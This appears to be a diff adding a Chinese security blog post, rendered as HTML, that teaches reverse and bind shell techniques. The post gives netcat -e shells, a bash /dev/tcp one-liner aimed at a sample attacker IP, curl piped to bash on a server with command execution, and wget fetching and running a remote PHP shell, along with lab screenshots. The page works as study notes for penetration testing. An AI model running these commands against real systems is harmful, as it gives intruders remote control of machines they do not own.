@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="监听，弹弹弹">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹shell">
+<meta property="og:url" content="https://ttoc.xin/Reverses-shell/index.html">
+<meta property="og:site_name" content="Ttoc&#39;s blog">
+<meta property="og:description" content="监听，弹弹弹">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ttoc.xin/Reverses-shell/image-20221019235717724.png">
+<meta property="og:image" content="https://ttoc.xin/Reverses-shell/image-20221020000027288.png">
+<meta property="og:image" content="https://ttoc.xin/Reverses-shell/image-20221020000337460.png">
+<meta property="og:image" content="https://ttoc.xin/Reverses-shell/image-20221020000353533.png">
+<meta property="article:published_time" content="2023-02-13T13:56:59.573Z">
+<meta property="article:modified_time" content="2023-08-06T08:00:32.766Z">
+<meta property="article:author" content="Ttoc">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ttoc.xin/Reverses-shell/image-20221019235717724.png">
+
+<link rel="canonical" href="https://ttoc.xin/Reverses-shell/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>反弹shell | Ttoc's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ttoc's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/Reverses-shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ttoc">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ttoc's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反弹shell
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-02-13 21:56:59" itemprop="dateCreated datePublished" datetime="2023-02-13T21:56:59+08:00">2023-02-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-06 16:00:32" itemprop="dateModified" datetime="2023-08-06T16:00:32+08:00">2023-08-06</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/daily/" itemprop="url" rel="index"><span itemprop="name">daily</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><code>监听，弹弹弹</code></p>
+<span id="more"></span>
+
+<h1 id="反弹shell姿势"><a href="#反弹shell姿势" class="headerlink" title="反弹shell姿势"></a>反弹shell姿势</h1><h2 id="netcat-一句话反弹"><a href="#netcat-一句话反弹" class="headerlink" title="netcat 一句话反弹"></a>netcat 一句话反弹</h2><p>获取<code>shell</code>（想反弹谁的<code>shell</code>就在谁的后面加<code>-e /bin/sh</code>或<code>-e /bin/bash</code>）</p>
+<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向<code>shell</code></h3><p> 客户端主动连接服务器并获取服务器shell</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">客户端主动连接并得到反弹shell</span>    </span><br><span class="line">    <span class="string">nc</span> <span class="string">服务端ip</span> <span class="number">8888</span></span><br><span class="line"><span class="string">服务端监听连接</span></span><br><span class="line">    <span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line">    <span class="comment"># windows上：nc -lvp 8888 -e c:\windows\system32\cmd.exe </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向<code>shell</code></h3><p>服务器端连接并反弹<code>shell</code>给客户端</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">客户端监听</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvp</span> <span class="number">8888</span> </span><br><span class="line"><span class="string">服务端连接客户端</span></span><br><span class="line"><span class="string">nc</span> <span class="string">客户端ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">/bin/sh</span> </span><br><span class="line"></span><br><span class="line"><span class="string">windows上：nc</span> <span class="string">ip</span> <span class="number">8888</span> <span class="string">-e</span> <span class="string">c:\windows\system32\cmd.exe</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a>bash反弹shell</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/我们靶机ip/我们靶机 port <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><code>bash</code>一句话命令详解<br>以下针对常用的<code>bash</code>反弹一句话进行了拆分说明，具体内容如下</p>
+<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221019235717724.png"><img src="/Reverses-shell/image-20221019235717724.png" alt="image-20221019235717724"></a></p>
+<blockquote>
+<p>其实以上bash反弹一句完整的解读过程就是：<br>bash产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个<code>tcp 8080</code>会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p>
+</blockquote>
+<p>在反弹<code>shell</code>时要借助<code>netcat</code>工具反弹</p>
+<h2 id="curl反弹shell"><a href="#curl反弹shell" class="headerlink" title="curl反弹shell"></a>curl反弹shell</h2><p>前提要利用<code>bash</code>一句话的情况下使用<code>curl</code>反弹<code>shell</code></p>
+<p>在存在<code>命令执行</code>的服务器上执行</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl [自己的服务器]ip<span class="string">|bash</span></span><br><span class="line"><span class="comment">//在利用curl里执行我自己的服务器上的bash一句话</span></span><br></pre></td></tr></table></figure>
+
+<p>该<code>ip</code>的<code>index</code>文件上含有<code>bash</code>一句话，就可以反弹<code>shell</code>。</p>
+<p>例如在自己的服务器<code>index文件</code>上写上一句话</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.20.151</span>/<span class="number">7777</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>192.168.20.151</code>就是作为监听端口的服务器【攻击机】用来得到反弹的shell。</p>
+<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000027288.png"><img src="/Reverses-shell/image-20221020000027288.png" alt="image-20221020000027288"></a></p>
+<p> 存在一句话，利用<code>curl</code>反弹。<br><code>kali</code>开启监听</p>
+<p><a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000337460.png"><img src="/Reverses-shell/image-20221020000337460.png" alt="image-20221020000337460"></a></p>
+<h2 id="wget方式反弹shell"><a href="#wget方式反弹shell" class="headerlink" title="wget方式反弹shell"></a><code>wget</code>方式反弹<code>shell</code></h2><p>利用<code>wget</code>进行下载执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget 192.168.20.130/shell.txt -O /tmp/x.php &amp;&amp; php /tmp/x.php</span><br></pre></td></tr></table></figure>
+
+<p>利用下面贴出的<code>php</code>进行反弹。<br>开启监听</p>
+<p> <a data-fancybox="gallery" data-src="/Reverses-shell/image-20221020000353533.png"><img src="/Reverses-shell/image-20221020000353533.png" alt="image-20221020000353533"></a></p>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Linux-PowerUp\" rel="bookmark">Linux特殊权限位</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"># 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/php-functions/" rel="prev" title="PHP函数记录">
+      <i class="fa fa-chevron-left"></i> PHP函数记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/tooluse(sqlmap)/" rel="next" title="sqlmap使用总结">
+      sqlmap使用总结 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell%E5%A7%BF%E5%8A%BF"><span class="nav-number">1.</span> <span class="nav-text">反弹shell姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#netcat-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%8D%E5%BC%B9"><span class="nav-number">1.1.</span> <span class="nav-text">netcat 一句话反弹</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%90%91shell"><span class="nav-number">1.1.1.</span> <span class="nav-text">正向shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%90%91shell"><span class="nav-number">1.1.2.</span> <span class="nav-text">反向shell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bash%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.2.</span> <span class="nav-text">bash反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.3.</span> <span class="nav-text">curl反弹shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wget%E6%96%B9%E5%BC%8F%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">1.4.</span> <span class="nav-text">wget方式反弹shell</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Ttoc"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">Ttoc</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">51</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ttoc</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
